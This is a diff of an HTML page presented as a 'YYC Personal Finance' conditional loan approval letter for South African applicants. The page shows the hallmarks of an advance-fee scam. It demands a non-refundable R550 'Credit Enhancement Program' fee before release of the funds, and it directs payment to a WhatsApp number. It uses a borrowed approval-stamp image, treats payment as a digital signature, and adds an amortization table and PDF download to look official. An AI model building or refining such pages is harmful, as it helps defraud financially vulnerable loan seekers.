@@ -1,443 +1,403 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Loan Approval - YYC Loans</title>
-<head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>Loan Approval - YYC CASH LOAN | NCRCP15906</title>
+    <title>Loan Agreement & Approval - YYC Personal Finance</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
             --primary: #d61313;
-            --secondary: #e63946;
-            --accent: #f1c40f;
-            --light: #ffffff;
-            --dark: #212529;
+            --secondary: #1C75BC;
+            --dark: #333;
             --gray: #6c757d;
+            --page-bg: #f9f9f9;
+            --doc-bg: #ffffff;
             --success: #28a745;
-            --danger: #dc3545;
-            --gradient-secondary: linear-gradient(135deg, #e63946 0%, #d61313 100%);
         }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
 
         body {
-            background: #f9f9f9;
-            padding: 30px 30px 80px 30px;
-            color: #333;
-            line-height: 1.6;
-        }
-
-        /* Header */
-        header {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            padding: 15px 5%;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            z-index: 1000;
-            box-shadow: 0 2px 20px rgba(0,0,0,0.1);
-        }
-
-        .logo {
-            display: flex;
-            align-items: center;
-        }
-
-        .logo h1 {
-            font-size: 1.5rem;
-            color: var(--primary);
-            font-weight: 700;
-        }
-
-        .logo .ncr {
-            font-size: 0.8rem;
-            color: var(--gray);
-            margin-left: 10px;
-        }
-
-        /* Desktop Navigation */
-        .desktop-nav {
-            display: block;
-        }
-
-        .desktop-nav ul {
-            display: flex;
-            list-style: none;
-            gap: 20px;
-        }
-
-        .desktop-nav .nav-link {
-            text-decoration: none;
+            background-color: var(--page-bg);
+            font-family: 'Roboto', sans-serif;
             color: var(--dark);
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .toolbar {
+            position: fixed;
+            top: 15px;
+            right: 20px;
+            z-index: 1001;
+        }
+
+        .toolbar-btn {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 10px 18px;
+            border-radius: 5px;
+            cursor: pointer;
             font-weight: 500;
-            padding: 8px 16px;
-            border-radius: 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.25);
             transition: all 0.3s ease;
         }
+        
+        .toolbar-btn:hover {
+            background-color: #b00f0f;
+            transform: translateY(-2px);
+        }
 
-        .desktop-nav .nav-link:hover,
-        .desktop-nav .nav-link.active {
+        .document-container {
+            max-width: 850px; /* Slightly wider for A4 proportion */
+            margin: 20px auto;
+        }
+        
+        .page {
+            background: var(--doc-bg);
+            border: 1px solid #e0e0e0;
+            padding: 40px 50px;
+            position: relative;
+            min-height: 1120px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+
+        .doc-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            border-bottom: 3px solid var(--primary);
+            padding-bottom: 15px;
+            margin-bottom: 25px;
+        }
+
+        .doc-header .logo h1 {
             color: var(--primary);
-            background: rgba(214, 19, 19, 0.1);
+            font-size: 2.2rem;
+            margin: 0;
         }
 
-        /* Mobile Menu Button */
-        .mobile-menu-btn {
-            display: block;
-            background: none;
-            border: none;
-            font-size: 1.2rem;
-            cursor: pointer;
-            color: var(--dark);
-            padding: 8px;
+        .doc-header .logo h2 {
+            color: var(--secondary);
+            font-size: 1.1rem;
+            margin: 0;
+            font-weight: 500;
+        }
+        
+        .doc-header .header-info {
+            text-align: right;
+            font-size: 0.9rem;
+            color: var(--gray);
         }
 
-        /* Main Content */
-        .main-content {
-            margin-top: 100px;
-        }
-
-        .letter {
-            background: white;
-            padding: 30px;
-            max-width: 800px;
-            margin: auto;
-            border-radius: 12px;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
-        }
-
-        .header {
+        .doc-footer {
+            position: absolute;
+            bottom: 4px;
+            left: 50px;
+            right: 50px;
             text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .header h1 {
-            color: #d61313;
-            margin-bottom: 0;
-            font-size: 2.5rem;
-        }
-
-        .header h2 {
-            color: #1C75BC;
-            margin-top: 0;
-            font-size: 1.5rem;
+            font-size: 0.85rem;
+            color: var(--gray);
+            border-top: 1px solid #ddd;
+            padding-top: 10px;
         }
 
         h3 {
-            margin-top: 30px;
-            font-size: 1.1rem;
-            color: #000;
-            font-weight: 600;
+            font-size: 1.4rem;
+            color: var(--primary);
+            border-bottom: 1px solid #eee;
+            padding-bottom: 8px;
+            margin-top: 25px;
+            margin-bottom: 15px;
         }
 
-        .highlight {
-            font-weight: bold;
+        .info-box {
+            background: #f9f9f9;
+            border-left: 5px solid var(--secondary);
+            padding: 15px 20px;
+            margin: 20px 0;
+            border-radius: 5px;
         }
+        
+        .info-box ul { list-style: none; padding: 0; margin: 0; }
+        .info-box ul li { padding: 6px 0; display: flex; justify-content: space-between; font-size: 1.05rem; }
 
-        .footer {
-            margin-top: 40px;
-            font-size: 0.9rem;
-            border-top: 1px solid #ddd;
-            padding-top: 20px;
-            color: var(--gray);
+        .warning-box {
+            background: #fffbe6;
+            border: 1px solid #ffe58f;
+            border-left: 5px solid #ffc107;
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 8px;
         }
+        
+        .warning-box h4 { margin-top: 0; color: #d66b0a; font-size: 1.25rem; }
 
         .pay-now {
             display: inline-block;
-            background: var(--gradient-secondary);
+            background: var(--success);
             color: white;
             padding: 15px 30px;
-            border-radius: 25px;
+            border-radius: 5px;
             font-weight: bold;
             text-decoration: none;
-            margin-top: 15px;
             transition: all 0.3s ease;
             text-transform: uppercase;
             letter-spacing: 1px;
-            box-shadow: 0 8px 25px rgba(230, 57, 70, 0.3);
+            border: none;
+            cursor: pointer;
+                        padding: 40px;
+
         }
+        .pay-now:hover { background-color: #218838; transform: scale(1.05); }
 
-        .pay-now:hover {
-            transform: translateY(-3px) scale(1.05);
-            box-shadow: 0 15px 35px rgba(230, 57, 70, 0.5);
+        .amortization-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        .amortization-table th, .amortization-table td { border: 1px solid #ddd; padding: 10px; text-align: right; }
+        .amortization-table th { background-color: #f2f2f2; font-weight: 700; }
+        
+        .signature-section { margin-top: 50px; display: flex; justify-content: space-between; align-items: flex-end; }
+        .signature-block { border-top: 1px solid var(--dark); padding-top: 10px; width: 45%; }
+        .stamp-area { width: 45%; text-align: center; }
+        .stamp-area img { width: 130px; opacity: 0.8; }
+
+        /* Modal Styles */
+        .modal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.6); }
+        .modal-content { background-color: #fefefe; margin: 15% auto; padding: 30px; border-radius: 10px; width: 90%; max-width: 500px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+        .close-btn { color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
+        .contact-icon { font-size: 1.5rem; margin: 10px; color: var(--primary); }
+        
+        @media print {
+            body { padding: 0; background: #fff; }
+            .toolbar, .page { box-shadow: none; border: none; margin: 0; }
+            .document-container { width: 100%; }
+            .page { min-height: 0; page-break-after: always; }
+            .page:last-child { page-break-after: auto; }
         }
-
-        ul, ol {
-            margin: 15px 0;
-            padding-left: 20px;
-        }
-
-        li {
-            margin-bottom: 8px;
-        }
-
-        /* Mobile Navigation */
-        .mobile-nav {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            background-color: white;
-            display: block;
-            z-index: 1000;
-            box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
-            border-top: 1px solid rgba(0,0,0,0.1);
-        }
-
-        .mobile-nav ul {
-            display: flex;
-            list-style: none;
-            justify-content: space-around;
-            margin: 0;
-            padding: 0;
-        }
-
-        .mobile-nav ul li {
-            flex: 1;
-            text-align: center;
-        }
-
-        .mobile-nav ul li a {
-            display: block;
-            padding: 12px 5px;
-            color: var(--gray);
-            text-decoration: none;
-            font-size: 0.7rem;
-            transition: all 0.3s ease;
-        }
-
-        .mobile-nav ul li a.active {
-            color: var(--primary);
-        }
-
-        .mobile-nav ul li a i {
-            display: block;
-            font-size: 1.1rem;
-            margin-bottom: 3px;
-        }
-
-        /* Mobile Responsiveness */
-        @media (max-width: 768px) {
-            .desktop-nav {
-                display: none;
-            }
-
-            body {
-                padding: 15px 15px 80px 15px;
-            }
-
-            .main-content {
-                margin-top: 80px;
-            }
-
-            .letter {
-                padding: 20px;
-            }
-
-            .header h1 {
-                font-size: 2rem;
-            }
-
-            .header h2 {
-                font-size: 1.2rem;
-            }
-
-            h3 {
-                font-size: 1rem;
-                margin-top: 20px;
-            }
-
-            .logo h1 {
-                font-size: 1.3rem;
-            }
-
-            .logo .ncr {
-                font-size: 0.7rem;
-            }
-
-            .mobile-menu-btn {
-                font-size: 1.1rem;
-                padding: 6px;
-            }
-
-            .mobile-nav ul li a {
-                padding: 10px 5px;
-                font-size: 0.65rem;
-            }
-
-            .mobile-nav ul li a i {
-                font-size: 1rem;
-                margin-bottom: 2px;
-            }
-
-            .pay-now {
-                padding: 12px 25px;
-                font-size: 0.9rem;
-            }
-        }
-
-        /* Extra small phones */
-        @media (max-width: 480px) {
-            body {
-                padding: 10px 10px 70px 10px;
-            }
-
-            .letter {
-                padding: 15px;
-            }
-
-            .header h1 {
-                font-size: 1.8rem;
-            }
-
-            .header h2 {
-                font-size: 1.1rem;
-            }
-        }
-
-        /* Desktop styles */
-        @media (min-width: 769px) {
-            .desktop-nav {
-                display: block;
-            }
-            
-            .mobile-menu-btn,
-            .mobile-nav {
-                display: none;
-            }
-            
-            body {
-                padding-bottom: 30px;
-            }
-        }
-  </style>
+    </style>
 </head>
 <body>
-        <!-- Header -->
-    <header>
-        <div class="logo">
-            <h1>YYC CASH LOAN</h1>
-            <span class="ncr">NCRCP15906</span>
+
+<div class="toolbar">
+    <button class="toolbar-btn" id="downloadPdfBtn"><i class="fas fa-download"></i> Download PDF</button>
+</div>
+
+<div class="document-container" id="loanDocument">
+    <!-- Page 1: Approval & Fee -->
+    <div class="page" id="page1">
+        <div class="doc-header">
+            <div class="logo"><h1>YYC</h1><h2>PERSONAL FINANCE</h2></div>
+            <div class="header-info">
+                <strong>Loan Agreement:</strong> Conditionally Approved<br>
+                <strong>Date:</strong> <span id="current-date"></span><br>
+                <strong>Ref ID:</strong> L-202408-<span id="application-id"></span>
+            </div>
+        </div>
+
+        <h3>Subject: Conditional Loan Approval Notification</h3>
+        <p>Dear <strong id="user-name-body">Loading...</strong>,</p>
+        <p>We are pleased to inform you that your personal loan application has met the initial requirements and has been conditionally approved. This document outlines the approved terms and the final step required to disburse your funds.</p>
+
+        <div class="info-box">
+            <h4>Approved Loan Terms</h4>
+            <ul>
+                <li><span>Loan Amount Approved:</span> <strong id="loan-amount">R0.00</strong></li>
+                <li><span>Loan Repayment Term:</span> <strong id="loan-duration">0 Months</strong></li>
+                <li><span>Fixed Annual Interest Rate:</span> <strong>3.00%</strong></li>
+                <li><span>Estimated Monthly Installment:</span> <strong id="monthly-payment">R0.00</strong></li>
+            </ul>
         </div>
         
-        <!-- Desktop Navigation -->
-        <nav class="desktop-nav">
+        <div class="warning-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> Action Required: Credit Enhancement Program</h4>
+            <p>Our final assessment indicates that your credit score is below the standard threshold for immediate loan disbursement. To proceed, enrollment in our **Credit Enhancement Program** is mandatory.</p>
+            <p>This program is designed to strengthen your credit standing and guarantee the instant release of your funds. It is a one-time process with a proven success rate.</p>
             <ul>
-                <li><a href="index.html" class="nav-link">Home</a></li>
-                <li><a href="apply.html" class="nav-link">Apply</a></li>
-                <li><a href="loans.html" class="nav-link">Loans</a></li>
-                <li><a href="how-it-works.html" class="nav-link active">How It Works</a></li>
-                <li><a href="account.html" class="nav-link">Account</a></li>
+                <li><strong>One-Time Program Fee:</strong> <strong style="color: var(--primary); font-size: 1.3em;">R550.00</strong></li>
             </ul>
-        </nav>
-        
-        <!-- Mobile Menu Button -->
-        <button class="mobile-menu-btn" id="mobileMenuBtn">
-            <i class="fas fa-bars"></i>
-        </button>
-    </header>
-  <div class="letter">
-    <div class="header">
-      <h1>YYC</h1>
-      <h2>PERSONAL FINANCE</h2>
+            <p class="highlight">Upon successful payment of this fee, your approved loan of <strong id="loan-amount-2">R0.00</strong> will be transferred to your bank account without any further delay.</p>
+        </div>
+
+        <h3>Final Step to Receive Your Loan</h3>
+        <p>To finalize the agreement and trigger the immediate transfer of funds, please complete the payment for the Credit Enhancement Program.</p>
+        <div style="text-align: center; margin-top: 30px;">
+            <button id="payNowBtn" class="pay-now">💳 Pay R550 Now & Secure Loan</button>
+        </div>
+
+        <div class="doc-footer">Page 1 of 3</div>
     </div>
 
-    <p><span class="highlight">Applicant’s Full Name:</span> <span id="user-name">Loading...</span></p>
+    <!-- Page 2: Amortization Schedule -->
+    <div class="page" id="page2">
+        <div class="doc-header">
+            <div class="logo"><h1>YYC</h1><h2>PERSONAL FINANCE</h2></div>
+            <div class="header-info"><strong>Attachment:</strong> Loan Amortization Schedule</div>
+        </div>
+        <h3>Loan Repayment Schedule</h3>
+        <p>This table details the breakdown of each monthly payment over the loan term, showing how each payment contributes to interest and reduces your outstanding principal balance.</p>
+        
+        <table class="amortization-table">
+            <thead>
+                <tr>
+                    <th>Payment #</th>
+                    <th>Payment Amount</th>
+                    <th>Interest Paid</th>
+                    <th>Principal Paid</th>
+                    <th>Remaining Balance</th>
+                </tr>
+            </thead>
+            <tbody id="amortization-body">
+                <!-- Rows will be generated by JavaScript -->
+            </tbody>
+        </table>
 
-    <h3>Subject: Loan Approval Confirmation</h3>
-    <p>
-      We are pleased to inform you that your loan application has been approved under the following terms:
-    </p>
-    <ul>
-      <li><strong>Loan Amount Approved:</strong> <span id="loan-amount">R0</span></li>
-      <li><strong>Loan Duration:</strong> <span id="loan-duration">0</span> Months</li>
-      <li><strong>Monthly Installment:</strong> <span id="monthly-payment">R0.00</span></li>
-      <li><strong>Interest Rate:</strong> 3%</li>
-    </ul>
+        <div class="doc-footer">Page 2 of 3</div>
+    </div>
+    
+    <!-- Page 3: T&Cs and Signature -->
+    <div class="page" id="page3">
+        <div class="doc-header">
+            <div class="logo"><h1>YYC</h1><h2>PERSONAL FINANCE</h2></div>
+            <div class="header-info"><strong>Attachment:</strong> Terms & Declaration</div>
+        </div>
+        <h3>Terms & Conditions</h3>
+        <ul>
+            <li><strong>Agreement:</strong> This document constitutes a conditional loan offer. It becomes a binding agreement upon the fulfillment of all stated conditions.</li>
+            <li><strong>Credit Enhancement Fee:</strong> The R550 fee is a non-refundable payment for services rendered to improve the applicant's credit profile to meet disbursement criteria. It is not part of the loan principal.</li>
+            <li><strong>Prepayment:</strong> The loan may be settled early in full or in part at any time without incurring penalties.</li>
+            <li><strong>Default:</strong> Failure to make timely monthly payments may result in late fees, legal action, and adverse reporting to national credit bureaus, which will impact your credit score.</li>
+            <li><strong>Privacy:</strong> All personal information is handled in strict compliance with the Protection of Personal Information (POPI) Act of South Africa.</li>
+        </ul>
 
-    <h3>Credit Improvement Program (R50)</h3>
-    <p>
-      To help you secure the best terms and unlock your loan instantly, we recommend our Credit Improvement Program.
-      It ensures better credit positioning and includes:
-    </p>
-    <ul>
-      <li>Comprehensive Credit Analysis</li>
-      <li>30-minute Advisory Session</li>
-      <li>Loan Disbursement Facilitation</li>
-      <li>Long-Term Financial Tools</li>
-    </ul>
-    <p>This is not a “processing fee”—it’s a one-time support step to ensure faster loan access and better terms.</p>
+        <h3>Declaration & Signature</h3>
+        <p>By proceeding with the payment, I, <strong id="user-name-3">Loading...</strong>, confirm that I have read, fully understood, and agree to all terms and conditions outlined in this 3-page loan document. I authorize YYC Loans to execute the Credit Enhancement Program and disburse the approved loan funds into my designated account upon successful payment of the R550 fee.</p>
 
-    <h3>Improvement Process</h3>
-    <p>
-      To enroll and unlock your loan instantly:
-    </p>
-    <ol>
-      <li>Clear “Improvement Process” to this message to enroll</li>
-      <li>Pay R50 by clicking the button below</li>
-      <li>Once cleared, you get your loan the same time</li>
-    </ol>
-    <a class="pay-now" href=" https://yycloan.github.io/free/Vouchers.html" target="_blank">💳 Pay Now</a>
+        <div class="signature-section">
+            <div class="signature-block">
+                <strong>Applicant's Acknowledgment & Digital Assent</strong>
+                <p style="font-size: 0.9rem;">(Payment of fee constitutes a digital signature)</p>
+            </div>
+            <div class="stamp-area">
+                <img src="https://style.propertystories.co.za/wp-content/uploads/2019/10/3_Original_Approved_Stamp_-_Copy-1-300x203.png" alt="Official Approval Stamp">
+                <p class="highlight" style="margin:0;">For YYC Loans Management</p>
+            </div>
+        </div>
+        <div class="doc-footer">Page 3 of 3</div>
+    </div>
+</div>
 
-    <div class="footer">
-      <p>YYC Loans is a registered credit provider.</p>
-      <p>NCR Registration No: NCRCP11356 | Legal Reg No: 2018/317490/07</p>
-      <p>20 Georgian Crescent, Bryanston East, Hampton Office Park, Johannesburg 2191</p>
-      <p>Date: <span id="current-date"></span></p>
+<!-- The Modal -->
+<div id="contactModal" class="modal">
+  <div class="modal-content">
+    <span class="close-btn">×</span>
+    <h3>Secure Payment & Inquiries</h3>
+    <p>For the R550 fee, please use your Loan Ref ID: <strong>L-202408-<span id="application-id-modal"></span></strong></p>
+    <div>
+        <i class="fab fa-whatsapp contact-icon"></i>
+        <p><strong>WhatsApp Payments:</strong> +27 12 345 6789</p>
+    </div>
+    <div>
+        <i class="fas fa-envelope contact-icon"></i>
+        <p><strong>Email Support:</strong> payments@yycloans.co.za</p>
     </div>
   </div>
-  
-   <!-- Mobile Navigation -->
-    <nav class="mobile-nav" id="mobileNav">
-        <ul>
-            <li><a href="index.html"><i class="fas fa-home"></i>Home</a></li>
-            <li><a href="apply.html"><i class="fas fa-file-alt"></i>Apply</a></li>
-            <li><a href="loans.html"><i class="fas fa-money-bill-wave"></i>Loans</a></li>
-            <li><a href="how-it-works.html"><i class="fas fa-info-circle"></i>How It Works</a></li>
-            <li><a href="account.html" class="active"><i class="fas fa-user"></i>Account</a></li>
-        </ul>
-    </nav>
+</div>
 
+<script>
+    const formatCurrency = (num) => `R${num.toLocaleString('en-ZA', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
 
-  <script>
-    function loadApprovalData() {
-      const data = JSON.parse(localStorage.getItem('loanApplication')) || {};
+    function generateAmortizationSchedule(principal, duration, monthlyRate, monthlyPayment) {
+        const tableBody = document.getElementById("amortization-body");
+        tableBody.innerHTML = ''; // Clear previous entries
+        let remainingBalance = principal;
 
-      const name = data.fullName || 'Not Provided';
-      const amount = parseFloat(data.loanAmount?.replace(/[^0-9.]/g, '') || 0);
-      const duration = parseInt(data.loanDuration || 0);
+        for (let i = 1; i <= duration; i++) {
+            const interestPaid = remainingBalance * monthlyRate;
+            const principalPaid = monthlyPayment - interestPaid;
+            remainingBalance -= principalPaid;
+            
+            // Ensure final balance is exactly zero
+            if (i === duration) {
+                remainingBalance = 0;
+            }
 
-      // Calculate monthly installment (3% annual interest)
-      const annualRate = 0.03;
-      const monthlyRate = annualRate / 12;
-      const monthlyPayment = amount && duration
-        ? ((monthlyRate * amount) / (1 - Math.pow(1 + monthlyRate, -duration))).toFixed(2)
-        : "0.00";
-
-      document.getElementById("user-name").textContent = name;
-      document.getElementById("loan-amount").textContent = `R${amount.toLocaleString()}`;
-      document.getElementById("loan-duration").textContent = duration;
-      document.getElementById("monthly-payment").textContent = `R${parseFloat(monthlyPayment).toLocaleString()}`;
-
-      const today = new Date().toLocaleDateString("en-ZA");
-      document.getElementById("current-date").textContent = today;
+            const row = `<tr>
+                <td>${i}</td>
+                <td>${formatCurrency(monthlyPayment)}</td>
+                <td>${formatCurrency(interestPaid)}</td>
+                <td>${formatCurrency(principalPaid)}</td>
+                <td>${formatCurrency(Math.abs(remainingBalance))}</td>
+            </tr>`;
+            tableBody.innerHTML += row;
+        }
     }
 
+    function loadApprovalData() {
+        const data = JSON.parse(localStorage.getItem('loanApplication')) || {
+            fullName: 'Valued Applicant',
+            loanAmount: '25000',
+            loanDuration: '24'
+        };
+
+        const name = data.fullName;
+        const amount = parseFloat(data.loanAmount.replace(/[^0-9.]/g, ''));
+        const duration = parseInt(data.loanDuration, 10);
+        const appId = Math.floor(1000 + Math.random() * 9000);
+
+        const annualRate = 0.03;
+        const monthlyRate = annualRate / 12;
+        let monthlyPayment = 0;
+        if (amount && duration > 0 && monthlyRate > 0) {
+            monthlyPayment = (amount * monthlyRate * Math.pow(1 + monthlyRate, duration)) / (Math.pow(1 + monthlyRate, duration) - 1);
+        }
+
+        // Populate all dynamic fields
+        document.getElementById("user-name-body").textContent = name;
+        document.getElementById("user-name-3").textContent = name;
+        document.getElementById("application-id").textContent = appId;
+        document.getElementById("application-id-modal").textContent = appId;
+        
+        document.getElementById("loan-amount").textContent = formatCurrency(amount);
+        document.getElementById("loan-amount-2").textContent = formatCurrency(amount);
+        document.getElementById("loan-duration").textContent = `${duration} Months`;
+        document.getElementById("monthly-payment").textContent = formatCurrency(monthlyPayment);
+
+        const today = new Date().toLocaleDateString("en-ZA", { year: 'numeric', month: 'long', day: 'numeric' });
+        document.getElementById("current-date").textContent = today;
+        
+        // Generate schedule
+        generateAmortizationSchedule(amount, duration, monthlyRate, monthlyPayment);
+    }
+
+    // Modal logic
+    const modal = document.getElementById("contactModal");
+    const btn = document.getElementById("payNowBtn");
+    const span = document.getElementsByClassName("close-btn")[0];
+    btn.onclick = () => modal.style.display = "block";
+    span.onclick = () => modal.style.display = "none";
+    window.onclick = (event) => {
+        if (event.target == modal) modal.style.display = "none";
+    };
+
+    // PDF Download logic
+    document.getElementById('downloadPdfBtn').addEventListener('click', function () {
+        const element = document.getElementById('loanDocument');
+        const opt = {
+            margin:       [0, 0, 0, 0],
+            filename:     `YYC_Loan_Agreement_${document.getElementById("application-id").textContent}.pdf`,
+            image:        { type: 'jpeg', quality: 0.98 },
+            html2canvas:  { scale: 2, useCORS: true },
+            jsPDF:        { unit: 'in', format: 'a4', orientation: 'portrait' }
+        };
+        html2pdf().set(opt).from(element).save();
+    });
+
     document.addEventListener("DOMContentLoaded", loadApprovalData);
-  </script>
+</script>
+
 </body>
 </html>
